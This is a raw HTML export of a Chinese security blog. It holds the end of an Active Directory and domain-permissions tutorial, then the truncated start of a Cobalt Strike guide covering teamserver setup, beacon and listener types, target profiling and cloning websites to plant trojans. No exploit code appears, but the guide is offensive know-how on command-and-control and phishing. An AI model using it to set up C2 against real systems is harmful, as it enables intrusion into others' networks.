src="/img/image-20231001161300878.png" alt="image-20231001161300878" style="zoom:67%;" /><img src="/img/image-20231001161404912.png" alt="image-20231001161404912" style="zoom:67%;" /><p>更改计算机名  加入域hack.com</p><img src="/img/image-20231001161538871.png" alt="image-20231001161538871" style="zoom:67%;" /><p>验证：需要输入<strong>域控的管理员账号密码</strong></p><img src="/img/image-20231001161814606.png" alt="image-20231001161814606" style="zoom:67%;" /><img src="/img/image-20231001161855732.png" alt="image-20231001161855732" style="zoom:80%;" /><p>重启即可 此时2008可通过两种方式登录</p><p>方式1：本地administrator用户</p><img src="/img/image-20231001162159736.png" alt="image-20231001162159736" style="zoom:67%;" /><p><img src="/img/image-20231001162423605.png" alt="image-20231001162423605"></p><p>方式2：切换用户  使用DC中新建的用户jack登录</p><p><img src="/img/image-20231001162315013.png" alt="image-20231001162315013"></p><h2 id="3-活动目录-Active-Directory-AD"><a href="#3-活动目录-Active-Directory-AD" class="headerlink" title="3.活动目录(Active Directory,AD)"></a>3.活动目录(Active Directory,AD)</h2><p>活动目录( Active Directory,AD)是指域环境中提供目录服务的组件 </p><p>目录<strong>用于存储有关网络对象(例如用户、组、计算机、共享资源、打印机和联系人等)的信息</strong>。</p><p>目录服务是指帮助用户快速、准确地从目录中找到其所需要的信息的服务。活动目录实现了目录服务,为企业提供了网络环境的集中式管理机制活动目录的逻辑结构包括前面讲过的组织单元(OU)、域、域树、域森林。域树内的所有域共享一个活动目录,这个活动目录内的数据分散存储在各个域中,且每个域只存储该域内的数据</p><p>活动目录主要提供以下功能 ：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">1.账号集中管理:所有账号均存储在服务器中,以便执行命令和重置密码等。 </span><br><span class="hljs-section">2.软件集中管理:统一推送软件、安装网络打印机等。利用软件发布策略分发软件,可以让 用户自由选择需要安装的软件。 3.环境集中管理:统一客户端桌面、IE、TCPP协议等设置。 </span><br><span class="hljs-section">4.增强安全性:统一部署杀毒软件和病毒扫描任务、集中管理用户的计算机权限、统一制定用户密码策略等。可以监控网络,对资料进行统一管理。 </span><br><span class="hljs-section">5.更可靠,更短的宕机时间:例如,利用活动目录控制用户访问权限,利用群集、负载均衡等技术对文件服务器进行容灾设置。网络更可靠,宕机时间更短。 </span><br>6.活动目录是微软提供的统一管理基础平台,ISA、 Exchange、SMS等都依赖这个平台<br></code></pre></td></tr></table></figure><p>管理工具–AD用户和计算机</p><ul><li>Builtin 管理安全组</li></ul><img src="/img/image-20231001164501632.png" alt="image-20231001164501632" style="zoom:50%;" /><ul><li>Computers  加入域的计算机</li></ul><img src="/img/image-20231001164639417.png" alt="image-20231001164639417" style="zoom:67%;" /><ul><li>Domain Controller 域控</li></ul><img src="/img/image-20231001164817074.png" alt="image-20231001164817074" style="zoom:67%;" /><ul><li>Users  存放用户信息</li></ul><img src="/img/image-20231001164905511.png" alt="image-20231001164905511" style="zoom:67%;" /><p>例：</p><p>1.添加用户到域管理员组</p><p>右键添加到组–&gt;选择Domain Admins</p><img src="/img/image-20231001165310525.png" alt="image-20231001165310525" style="zoom: 67%;" /><img src="/img/image-20231001165342146.png" alt="image-20231001165342146" style="zoom:67%;" /><p>2.新建用户+新建组+添加用户到组</p><p>Users–&gt;右键新建 用户–&gt;设置密码</p><img src="/img/image-20231001165450445.png" alt="image-20231001165450445" style="zoom:50%;" /><p><img src="/img/image-20231001165659717.png" alt="image-20231001165659717"></p><p>Users–&gt;右键新建组</p><img src="/img/image-20231001165821695.png" alt="image-20231001165821695" style="zoom:50%;" /><p><img src="/img/image-20231001165836766.png" alt="image-20231001165836766"></p><p>右键用户添加到组</p><img src="/img/image-20231001165934194.png" alt="image-20231001165934194" style="zoom:50%;" /><h3 id="组织单元"><a href="#组织单元" class="headerlink" title="组织单元"></a>组织单元</h3><p>组织单元（OU）是域中包含的一类目录对象如用户、计算机和组、文件与打印机等资源，是一个容器，可以在OU上部署组策略</p><p>组织单元是域中包含的一类目录对象如用户、计算机和组、文件与打印机等资源。是一个容器。组织单元还具有分层结构可用来建立域的分层结构模型，进而可使用户把网络所需的域的数量减至最小</p><p>例如AD中的各个文件夹可以称为一个组织单元</p><img src="/img/image-20231001170618314.png" alt="image-20231001170618314" style="zoom:67%;" /><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><table><thead><tr><th>部门</th><th>人数</th></tr></thead><tbody><tr><td>财务部门</td><td>20</td></tr><tr><td>人事部门</td><td>10</td></tr><tr><td>IT部门</td><td>100</td></tr><tr><td>网络管理员</td><td>3</td></tr></tbody></table><p>1.创建组织单元</p><p>hack.com–&gt;右键新建组织单位</p><img src="/img/image-20231001171223217.png" alt="image-20231001171223217" style="zoom: 67%;" /><img src="/img/image-20231001171403713.png" alt="image-20231001171403713" style="zoom:50%;" /><p>2.在部门中新建用户</p><img src="/img/image-20231001171523193.png" alt="image-20231001171523193" style="zoom:50%;" /><img src="/img/image-20231001171647451.png" alt="image-20231001171647451" style="zoom:67%;" /><p>其余同理  组织单元下可再建组织单元</p><img src="/img/image-20231001171924903.png" alt="image-20231001171924903" style="zoom:67%;" /><h3 id="委派控制"><a href="#委派控制" class="headerlink" title="委派控制"></a>委派控制</h3><p>因为财务部门有20个人，不能有问题就去找网络管理员，需要委派控制权限给财务部门一个代表， 让他去执行，也就是说在财务部门找一个代表，他由相应的权限去管理财务部门的计算机和用户</p><img src="/img/image-20231001173300045.png" alt="image-20231001173300045" style="zoom: 67%;" /><img src="/img/image-20231001173332052.png" alt="image-20231001173332052" style="zoom:50%;" /><p>选择委派的权限：</p><img src="/img/image-20231001173354874.png" alt="image-20231001173354874" style="zoom:50%;" /><h2 id="4-域中的权限划分和基本思想"><a href="#4-域中的权限划分和基本思想" class="headerlink" title="4.域中的权限划分和基本思想"></a>4.域中的权限划分和基本思想</h2><h3 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h3><p>域本地组成员<strong>来自林中任何域中的用户账户、全局组和通用组以及本域中的域本地组</strong>，在<strong>本域范围</strong>内<br>可用。</p><h3 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h3><p>全局组成员<strong>来自于同一域的用户账户和全局组</strong>，在<strong>全林范围</strong>内可用</p><h3 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h3><p>通用组成员<strong>来自林中任何域中的用户账户、全局组和其他的通用组</strong>，在<strong>全林范围</strong>内可用</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">域本地组来自全林,作用于本域;<br>全局组来自本域,作用于全林;<br>通用组来自全林,作用于全林。<br></code></pre></td></tr></table></figure><h3 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h3><p>有一个打印机连接域控，设置域本地组赋予使用打印机的权限，然后设置全局组，将人员都加入到全<br>局组，然后将全局组加入到域本地组就可以了</p><img src="/img/image-20231001175136519.png" alt="image-20231001175136519" style="zoom: 33%;" /><h3 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h3><p>有三个域hack.com(在北京)，sh.hack.com(在上海)，gz.hack.com(在广州)组成W林，然后北京财<br>务部门，需要进行结算，但是数据在北京的一台服务器上权限比较高只有北京财务人员可以使用，同<br>时因为北京人数不够，需要上海和广州支援，这个时候怎么办？<br>1、只需要在北京的建立一个域本地组，然后赋予域本地组权限可以访问财务的数据机器<br>2、在上海和广州分别建立全局组<br>3、在北京的域控上将上海和广州的全局组加入进来</p><img src="/img/image-20231001175612770.png" alt="image-20231001175612770" style="zoom: 33%;" /><h3 id="A-G-DL-P策略"><a href="#A-G-DL-P策略" class="headerlink" title="A-G-DL-P策略"></a>A-G-DL-P策略</h3><p>A-G-DL-P策略是指将用户账号添加到全局组（将其当作一个集合，不给权限）中,将全局组添加到域本地组中,然后为域本地组分配资源权限</p><p>A表示用户账号( Account) </p><p>G表示全局组( Global Group) </p><p>U表示通用组( Universal Group) </p><p>DL表示域本地组( Domain Local Group) </p><p>P表示资源权限( Permission,许可)</p><h3 id="重要的域本地组"><a href="#重要的域本地组" class="headerlink" title="重要的域本地组"></a>重要的域本地组</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">• 管理员组(Administrators)的成员可以不受限制地存取计算机/域的资源。它不仅是最具权力的一个组,也是在活动目录和域控制器中默认具有管理员权限的组。该组的成员可以更改 Enterprise Admins、<span class="hljs-keyword">Schema</span> admins和<span class="hljs-keyword">Domain</span> admins组的成员关系,是域森林中强大的 服务管理组 <br>• 远程登录组(Remote Desktop Users)的成员具有远程登录权限。 <br>• 打印机操作员组( Print Operators)的成员可以管理网络打印机,包括建立、管理及删除网 络打印机, 并可以在本地登录和关闭域控制器。 <br>• 账号操作员组(Account Operators)的成员可以创建和管理该域中的用户和组并为其设置权 限,也 可以在本地登录域控制器,但是,不能更改属于 Administrators或 <span class="hljs-keyword">Domain</span> admins组 的账户,也不能 修改这些组。在默认情况下,该组中没有成员。 <br>• 服务器操作员组(<span class="hljs-keyword">Server</span> Operators)的成员可以管理域服务器,其权限包括建立管理删除 任意服务 器的共享目录、管理网络打印机、备份任何服务器的文件、格式化服务器硬盘 锁定服务器、变更服 务器的系统时间、关闭域控制器等。在默认情况下,该组中没有成员。 <br>• 备份操作员组(Backup Operators)的成员可以在域控制器中执行备份和还原操作,并可以 在本地登 录和关闭域控制器。在默认情况下,该组中没有成员 <br>• 再介绍几个重要的全局组、通用组的权限。 <br>• 域管理员组(<span class="hljs-keyword">Domain</span> Admins)的成员在所有加入域的服务器(工作站)、域控制器和活动 目录中均 默认拥有完整的管理员权限。因为该组会被添加到自己所在域的Administrators 组中,因此可以继 承 Administrators组的所有权限。同时,该组默认会被添加到每台域成员 计算机的本地Administrators组中,这样, <span class="hljs-keyword">Domain</span> admins组就获得了域中所有计算机的所 有权。如果希望某用户 成为域系统管理员,建议将该用户添加到 <span class="hljs-keyword">Domain</span> admins组中,而 不要直接将该用户添加到Administrators组中。 <br>• 企业系统管理员组(Enterprise Admins)是域森林根域中的一个组。该组在域森林中的每个 域内都 是 Administrators组的成员,因此对所有域控制器都有完全访问权。 <br>• 架构管理员组(<span class="hljs-keyword">Schema</span> admins)是域森林根域中的一个组,可以修改活动目录和域森林的 模式。该 组是为活动目录和域控制器提供完整权限的域用户组,因此,该组成员的资格是 非常重要的。 <br>• 域用户组(<span class="hljs-keyword">Domain</span> users)中是所有的域成员。在默认情况下,任何由我们建立的用户账号 都属于<span class="hljs-keyword">Domain</span> Users组,而任何由我们建立的计算机账号都属于<span class="hljs-keyword">Domain</span> Computers组。因 此,如果想让 所有的账号都获得某种资源存取权限,可以将该权限指定给域用户组,或者 让域用户组属于具有该权限 的组。域用户组默认是内置域 Users组的成员<br></code></pre></td></tr></table></figure><h2 id="5-安全域划分"><a href="#5-安全域划分" class="headerlink" title="5.安全域划分"></a>5.安全域划分</h2><p>​划分安全域的目的是<strong>将一组安全等级相同的计算机划入同一个网段</strong>。这个网段内的计算机拥 有相同的网络边界,并在网络边界上通过部署防火墙来实现对其他安全域的网络访问控制策略 ，从而对允许哪些IP地址访问此域、允许此域访问哪些IP地址和网段进行设置。这些措施,将使得网络风险最小化, 当攻击发生时,可以尽可能地将威胁隔离,从而降低对域内计算机的影响。</p><p><img src="/img/image-20231001180302998.png" alt="image-20231001180302998"></p><p>在一个用路由器连接的内网中,可以将网络划分为三个区域: </p><p>安全级别最高的内网; </p><p>安全级别中等的DMZ; </p><p>安全级别最低的外网 </p><p>在配置一个拥有DMZ的网络时,通常需要定义如下访问控制策略,以实现其屏障功能。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">内网可以访问外网:内网用户需要自由地访问外网。在这一策略中,防火墙需要执行NAT。</span><br><span class="hljs-section">内网可以访问DMZ:此策略使内网用户可以使用或者管理DMZ中的服务器</span><br><span class="hljs-section">外网不能访问内网:这是防火墙的基本策略。内网中存储的是公司内部数据,显然,这些数据一般是不允许外网用户访问的(如果要访问,就要通过VPN的方式来进行)</span><br><span class="hljs-section">外网可以访问DMZ:因为DMZ中的服务器需要为外界提供服务,所以外网必须可以访问DMZ。同时,需要由防火墙来完成从对外地址到服务器实际地址的转换。</span><br><span class="hljs-section">DMZ不能访问内网:如果不执行此策略,当攻击者攻陷DMZ时,内网将无法受到保护</span><br><span class="hljs-section">DMZ不能访问外网:此策略也有例外。例如,在DMZ中放置了邮件服务器,就要允许访问外网,否则邮件服务器无法正常工作</span><br></code></pre></td></tr></table></figure><p>办公区:公司员工日常的工作区,一般会安装防病毒软件、主机入侵检测产品等。</p><p>办公区一般能够访问DMZ。如果运维人员也在办公区,那么部分主机也能访问核心数据区(很多企业还会使用堡垒机来统一 管理用户的登录行为)攻击者如果想进入内网,一艘会使用鱼叉攻击、水坑攻击,当然还有社会工程学手段。</p><p>核心区:存储企业最重要的数据、文档等信息资产,通过日志记录、安全审计等安全措施进行严密的保护,往往只有很少的主机能够访问。</p><p>从外部是绝难直接访问核心区的。一般来说,能够直接访问核心区的只有运维人员或者IT部门的主管,所以,攻击者会重点关注这些用户的信息(攻击者在内网中进行横向 移动攻击时,会优先查找这些主机</p><h2 id="6-域中计算机的分类"><a href="#6-域中计算机的分类" class="headerlink" title="6.域中计算机的分类"></a>6.域中计算机的分类</h2><p>域中计算机的分类在域结构的网络中,计算机的身份是不平等的,有域控制器、成员服务器、客户机、 独立服务器四种类型。 </p><p>1、域控制器 （内网渗透目标）</p><p><strong>域控制器用于管理所有的网络访问,包括登录服务器、访问共享目录和资源</strong>。域控制器中存储了域内所有的账户和策略信息,包括安全策略、用户身份验证信息和账户信息。 </p><p>在网络中,可以有多台计算机被配置为域控制器,以分拒用广的登录、访问等操作。多个域控制器可以一起工作,自动备份用户账户和活动目录数据。这样,即使部分域控制器瘫痪,网络访问也不会受到影响,提高了网络的安全性和稳定性 </p><p>2、成员服务器 </p><p><strong>成员服务器是指安装了服务器操作系统并加入了域、但没有安装活动目录的计算机</strong>,其主要任务是提供网络资源。成员服务器的类型通常有文件服务器、应用服务器、数据库服务器、web服务器、邮件服务器、防火墙、远程访问服务器、打印服务器等  例如win2008Server等</p><p>3、客户机 </p><p>域中的计算机可以是安装了其他操作系统的计算机,用户利用这些计算机和域中的账户就可以登录域。这些计算机被称为域中的客户机。域用户账号通过域的安全验证后,即可访间网络中的各种资源。 </p><p>4、独立服务器 </p><p><strong>独立服务器和域没有关系</strong>。如果服务器既不加入域,也不安装活动目录,就称其为独立服务器。独立服务器可以创建工作组、与网络屮的其他计算机共享资源,但不能使用活动目录提供的任何服务 域控制器用于冇放活动目录数据库,是域屮必须要有的,而其他三种计算机则不是必须要有的，也就是说,最简单的域可以只包含</p>]]></content>
    
    
    <categories>
      
      <category>后渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CS基础操作</title>
    <link href="/2023/10/27/CS%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/"/>
    <url>/2023/10/27/CS%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="1-Cobalt-Strike的特点"><a href="#1-Cobalt-Strike的特点" class="headerlink" title="1 Cobalt Strike的特点"></a>1 Cobalt Strike的特点</h1><p>Cobalt Strike简称CS 用于团队作战使用，由一个服务端和多个客户端组成，<strong>能让多个攻击者这在一个团队服务器上共享目标资源和信息</strong></p><p>CS有很多Payload的生成模块 可以生成EXE，dll，vbs，图片马，bad，vba宏，和shellcode等等</p><p>CS还支持钓鱼攻击，可自动化挂马链接生成</p><p>CS还有很多后渗透模块，浏览器代理模块，端口转发 扫描，提权，socks代理 ，令牌窃取等</p><p>Cobalt Strike 分为服务端和客户端</p><p>服务端 可以部署在远程服务器下或者 部署在kali里</p><p>客户端 可以部署到本地  支持linux和windows系统</p><p><img src="/img/75b6e43ff3704734b9159eb6d869f2fb-1695967963040-46.png" alt="16478585820453010889ffy"></p><h1 id="2-Cobalt-Strike-安装与环境配置（kali）"><a href="#2-Cobalt-Strike-安装与环境配置（kali）" class="headerlink" title="2 Cobalt Strike 安装与环境配置（kali）"></a>2 Cobalt Strike 安装与环境配置（kali）</h1><p>准备环境 ：</p><p>CS4.4</p><p>jdk11（如果使用kali 则不需要另外安装jdk）</p><h2 id="2-1-其他linux系统安装jdk"><a href="#2-1-其他linux系统安装jdk" class="headerlink" title="2.1 其他linux系统安装jdk"></a>2.1 其他linux系统安装jdk</h2><p>使用 APT 安装 OpenJDK 11：</p><h4 id="1-升级APT"><a href="#1-升级APT" class="headerlink" title="1 升级APT"></a>1 升级APT</h4><p>sudo apt-get update</p><p>或</p><p>apt-get update</p><h4 id="2-使用-APT-安装-OpenJDK-11："><a href="#2-使用-APT-安装-OpenJDK-11：" class="headerlink" title="2 使用 APT 安装 OpenJDK 11："></a>2 使用 APT 安装 OpenJDK 11：</h4><p>sudo apt-get install openjdk-11-jdk</p><p>或</p><p>apt-get install openjdk-11-jdk</p><h4 id="3-将-OpenJDK-11-设置为默认-Java-程序："><a href="#3-将-OpenJDK-11-设置为默认-Java-程序：" class="headerlink" title="3 将 OpenJDK 11 设置为默认 Java 程序："></a>3 将 OpenJDK 11 设置为默认 Java 程序：</h4><p>sudo update-java-alternatives -s java-1.11.0-openjdk-amd64</p><p>或</p><p>update-java-alternatives -s java-1.11.0-openjdk-amd64</p><h2 id="2-2-开始安装"><a href="#2-2-开始安装" class="headerlink" title="2.2 开始安装"></a>2.2 开始安装</h2><p>Cobalt Strike 4.4 安装包</p><p><img src="/img/14891048f1a443189271648fb648ac83.png" alt="image.png">将CS4.4解压</p><p><img src="/img/f306b313bbb943a3a531743cf850d3c9.png" alt="image.png"></p><p>创建一个目录去存解压文件</p><p><img src="/img/0cc03d13fb46410e94bd9b42cd284a75.png" alt="image.png"></p><p><img src="/img/12c18a80417e40b4966cbefa5b838500.png" alt="image.png"></p><p>给服务的启动文件赋 777权限</p><p>进入终端找到CS4目录  然后 chmod 777 teamserver   （注意我这边是使用root终端操作的）</p><p><img src="/img/e18bba4c407d46499c610877916e6c78.png" alt="image.png"></p><p>完成环境配置</p><h1 id="3-Cobalt-Strike-安装与环境配置（Windows）"><a href="#3-Cobalt-Strike-安装与环境配置（Windows）" class="headerlink" title="3 Cobalt Strike 安装与环境配置（Windows）"></a>3 Cobalt Strike 安装与环境配置（Windows）</h1><h2 id="3-1-下载Windows-x64-OpenJDK：https-jdk-java-net-archive"><a href="#3-1-下载Windows-x64-OpenJDK：https-jdk-java-net-archive" class="headerlink" title="3.1 下载Windows x64 OpenJDK：https://jdk.java.net/archive/"></a>3.1 下载Windows x64 OpenJDK：<a href="https://jdk.java.net/archive/">https://jdk.java.net/archive/</a></h2><p><img src="/img/e682edc55ca341858951eba606500e93.png" alt="image.png"></p><p>然后解压并找个位置放这个  jdk-11.0.1  注意路径最好不要有中文。</p><p><img src="/img/image-20230929141211993-1695967963041-47.png" alt="image-20230929141211993"></p><p>我这边把jdk-11.0.1放到E盘根目录</p><h2 id="3-2-环境变量配置"><a href="#3-2-环境变量配置" class="headerlink" title="3.2 环境变量配置"></a>3.2 环境变量配置</h2><p><img src="/img/image-20231027095058244.png" alt="image-20231027095058244"></p><p><img src="/img/7d99f50064ff44a6a04548edc978fb5a.png" alt="image.png"></p><p>进入CMD  输入  java -version</p><p><img src="/img/image-20231027095113394.png" alt="image-20231027095113394"></p><h1 id="4-Cobalt-Strike团队服务器启动"><a href="#4-Cobalt-Strike团队服务器启动" class="headerlink" title="4 Cobalt Strike团队服务器启动"></a>4 Cobalt Strike团队服务器启动</h1><p>打开root终端进入CS 目录</p><p>在终端中输入： .&#x2F;teamserver 192.168.3.56 123456</p><p>解释</p><p><img src="/img/17e33ff4bb0541c5ab5330227eaa2a6b.png" alt="image.png"></p><p>看到这个提示证明已经启动完成</p><p><img src="/img/2265b42b4b3042a2bd5731c7a93fdc3a.png" alt="image.png"></p><p>到此CS服务器启动完成了</p><h1 id="5-Cobalt-Strike客户端连接到团队服务（Linux）"><a href="#5-Cobalt-Strike客户端连接到团队服务（Linux）" class="headerlink" title="5 Cobalt Strike客户端连接到团队服务（Linux）"></a>5 Cobalt Strike客户端连接到团队服务（Linux）</h1><p>进入CS目录</p><p><img src="/img/763fdb9573294f8e8b13188887fe801c.png" alt="image.png"></p><p>然后输入 .&#x2F;cobaltstrike  即可</p><p><img src="/img/2b7ab0a3a89e4d62aef2a1f2700f152a.png" alt="image.png"></p><p>第一次使用CS会提示权限不够</p><p><img src="/img/50f9dd89ad804e34a6aa17da343e9bc4.png" alt="image.png"></p><p>我们可以直接给cobaltstrike 赋777权限,然后在启动即课</p><p>终端内输入 chmod 777 cobaltstrike</p><p><img src="/img/83e597b74afc41d78438b7b16dba048e.png" alt="image.png"></p><p>启动CS完成后根据服务器配置输入IP ，端口，用户名，密码</p><p><img src="/img/675ee5966567465cb1ff2635c93a25dd.png" alt="image.png"></p><p>看到提示点击  Yes即可</p><p><img src="/img/0e5e7a66768940d9869afedf8822c4f1.png" alt="image.png"></p><p>稍等片刻即可启动完成 （如果电脑较卡启动时间会稍微有点长多等一下）</p><p><img src="/img/ef230c1ae9b044a6bbd42674b59e95d7.png" alt="image.png"></p><h1 id="6-Cobalt-Strike客户端连接团队服务（Windows）"><a href="#6-Cobalt-Strike客户端连接团队服务（Windows）" class="headerlink" title="6 Cobalt Strike客户端连接团队服务（Windows）"></a>6 Cobalt Strike客户端连接团队服务（Windows）</h1><p><strong>注意Cobalt Strike这款软件最好在虚拟机内执行避免后门反噬主机</strong></p><p>解压CS安装包</p><p><img src="/img/0793bde1003d48edb588f9a0fc4744e9.png" alt="image.png"></p><p>启动方法1 直接管理员方式执行 cobaltstrike.bat</p><p>启动方法2 在CMD中运行，注意CMD也要管理员权限</p><p><img src="/img/6df02bf4c9284e80a103c3d32bf246f5.png" alt="image.png"></p><p><img src="/img/a3f4f23a27e343248963b40253202635.png" alt="image.png"></p><p><img src="/img/bbfad5cfef1e4eceb6199c330cc0a46b.png" alt="image.png"></p><p>启动CS完成后根据服务器配置输入IP ，端口，用户名，密码</p><p><img src="/img/674fa8a677b64d738f83550ee9690670.png" alt="image.png"></p><p>看到服务器指纹确认点Yes  服务器指纹应与服务启动时一样</p><p><img src="/img/541c0b6de1fd45eda97084a4cc21b7a9.png" alt="image.png"></p><p><img src="/img/d8fdbc51c0194cc1966e3df1daef5e3f.png" alt="image.png"></p><hr><h1 id="7-Cobalt-Strik功能介绍"><a href="#7-Cobalt-Strik功能介绍" class="headerlink" title="7 Cobalt Strik功能介绍"></a>7 Cobalt Strik功能介绍</h1><p><img src="/img/df5f3a99e4f34d37addae0a7add4744a.png" alt="image.png"></p><p>图标栏功能说明</p><p>1 添加新的 Cobalt Strik 团队服务器</p><p>2 删除当前 Cobalt Strik 团队服务器</p><p>3 新建一个监听器</p><p>4 切换图形会话按钮</p><p>5 切换列表会话按钮</p><p>6  以列表方式显示目标</p><p>7 密码凭证栏按钮</p><p>8 下载文件列表</p><p>9 键盘记录表</p><p>10 屏幕截图表</p><p>11 生成Windows下可执行木马</p><p>12 生成java签名applet攻击</p><p>13 生成office 宏攻击</p><p>14 生成powershell后门</p><p>15  文件托管按钮</p><p>16 管理web站点</p><p>17 帮助文档</p><p>18 关于</p><h1 id="8-创建一个监控"><a href="#8-创建一个监控" class="headerlink" title="8  创建一个监控"></a>8  创建一个监控</h1><h2 id="8-1-监控器链接方式简介"><a href="#8-1-监控器链接方式简介" class="headerlink" title="8.1 监控器链接方式简介"></a><strong>8.1 监控器链接方式简介</strong></h2><p>beacon是cs内置的监听器，当我们在目标机器上成功执行Payload后，会返回一个shell发送到cs上。</p><p>foreign主要是提供给cs外的工具使用的监听器，例如派生出来msf的shell来进行后渗透。</p><p>External C2 是 cs引入的一种规范（或者框架），黑客可以利用这个功能拓展C2通信渠道，而不局限于默认提供的 http，https，dns，smb tcp 通道。大家可以参考 <a href="https://www.cobaltstrike.com/downloads/externalc2spec.pdf">此处</a> 下载完整的规范说明。</p><p>简而言之， 用户可以使用这个框架来开发各种组件，包括如下组件：</p><ul><li>第三方控制端（Controller）：负责连接 Cobalt Strike TeamServer，并且能够使用自定义的 C2 通道与目标主机上的第三方客户端（Client）通信。</li><li>第三方客户端（Client）：使用自定义C2通道与第三 Controller 通信，将命令转发至 SMB Beacon。</li><li>SMB Beacon：在受害者主机上执行的标准 beacon。</li></ul><h2 id="8-2-Beacon分类"><a href="#8-2-Beacon分类" class="headerlink" title="8.2 Beacon分类"></a><strong>8.2 Beacon分类</strong></h2><p><strong>Beacon是Cobalt Strike运行在目标主机上的payload，Beacons是在隐蔽信道上给我们提供服务，用于长期控制受感染主机</strong> 。它的工作方式与Metasploit类似。在实际渗透过程中，我们可以将其 <strong>嵌入到可执行文件</strong> 、<strong>添加到Word文档</strong>或者通过<strong>利用主机漏洞</strong>来传递Beacon。</p><ol><li>DNS Beacon</li><li>HTTP 和 HTTPS Beacon</li><li>SMB Beacon</li><li>TCP Beacon</li></ol><h3 id="8-2-1-DNS-Beacon"><a href="#8-2-1-DNS-Beacon" class="headerlink" title="8.2.1 DNS Beacon"></a>8.2.1 DNS Beacon</h3><p>DNS Beacon，就是使用DNS请求将Beacon返回。DNS 请求用于解析由你的 CS 团队服务器</p><p>DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务</p><p>注意：</p><p>在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式</p><p>DNS Beacon优点：</p><p>拥有更高的隐蔽性，但是速度相对于HTTP Beacon会更慢。</p><p><img src="/img/24a63e41aa7446c48a138e56a7a0b282.png" alt="image.png"></p><h3 id="8-2-2-HTTP-和-HTTPS-Beacon"><a href="#8-2-2-HTTP-和-HTTPS-Beacon" class="headerlink" title="8.2.2  HTTP 和 HTTPS Beacon"></a>8.2.2  HTTP 和 HTTPS Beacon</h3><p>HTTP Beacon 利用http请求来进行通信来向受害主机传达命令，达到控制对方主机的目的。缺点是明文传输。</p><p>HTTPS Beacon 增加了加密传输，其余跟http完全相同。</p><p><img src="/img/490042b5c64d41cbba7712d349202a15.png" alt="image.png"></p><h3 id="8-2-3-SMB-Beacon"><a href="#8-2-3-SMB-Beacon" class="headerlink" title="8.2.3  SMB Beacon"></a>8.2.3  SMB Beacon</h3><p><strong>官网的解释为</strong> ：<em>SMB Beacon 使用命名管道通过父 Beacon 进行通信，这种点对点通信借助 Beacons 在同一台主机上实现，它同样也适用于外部的互联网。Windows 当中借助在 SMB 协议中封装命名管道进行通信，因此，命名为 SMB Beacon。</em></p><p>以上的说法，其实就是将 <code>Payload</code> 运行（注入）后，创建了自定义命名管道（作服务端），等待连接即可。</p><p><img src="/img/36f68a11068245a5a5c5767802ee4e9f.png" alt="image.png"></p><h3 id="8-2-4-TCP-Beacon"><a href="#8-2-4-TCP-Beacon" class="headerlink" title="8.2.4  TCP Beacon"></a>8.2.4  TCP Beacon</h3><p>TCP Beacon和SMB Beacon类似只不过TCP Beacon不是使用SMB与父Beacon进行通信而是使用TCP socket进行通信，cs4.0之后，这个技术就不适合做第一个木马使用，因为他的流量都是明文的，容易被发现但是这个技术，很适合在内网穿透的时候去使用，在内网穿透的时候一般只能使用tcp beacon去生成木马。</p><p>点击<img src="/img/4d82efac16c54a67b750be2e4cfe5360.png" alt="image.png">或 点击监听器</p><p><img src="/img/d0c92611818942deaf90391569c9a856.png" alt="image.png"></p><p><img src="/img/6e3bf526c9f74669a51a578b06375eee.png" alt="image.png"></p><p><img src="/img/492cc938cbe843168614f1fb19a5c4c4.png" alt="image.png"></p><h1 id="9-Cobalt-Strik-目标主机信息收集"><a href="#9-Cobalt-Strik-目标主机信息收集" class="headerlink" title="9  Cobalt Strik 目标主机信息收集"></a>9  Cobalt Strik 目标主机信息收集</h1><p>Cobalt Strik内置信息收集模块 可以收集 目标主机的操作系统版本 系统位数  浏览器  版本  位数</p><p>方便攻击者针对性攻击</p><p><img src="/img/41a5c1651ac9441fb18126adbe6a0d4f.png" alt="image.png"></p><p>配置信息收集  有4个参数可以设置  分别为 本地URL   本地Host  本地端口  跳转URL</p><p>本地URL    配置的参数是访问ip后面的参数</p><p>本地Host   是当前Cobalt Strik服务器的内网或公网IP</p><p>本地端口    默认是80  如果80被占用了就需要设置其他的 如 81  82  83 都可以</p><p>跳转URL    默认可不设置跳转</p><p><img src="/img/a6c6782c584c4858b3fb03fb0170aee6.png" alt="image.png"></p><p>靶机访问  weblog中查看</p><h1 id="10-Cobalt-Strik-克隆网页并挂马"><a href="#10-Cobalt-Strik-克隆网页并挂马" class="headerlink" title="10 Cobalt Strik 克隆网页并挂马"></a>10 Cobalt Strik 克隆网页并挂马</h1><p>克隆网页</p><p><img src="/img/888d8d4f07db487589d76b409a9a283c.png" alt="image.png"></p><h2 id="10-1-配置网站克隆"><a href="#10-1-配置网站克隆" class="headerlink" title="10.1 配置网站克隆"></a>10.1 配置网站克隆</h2><p>克隆URL  输入http网站链接</p><p>本地URL    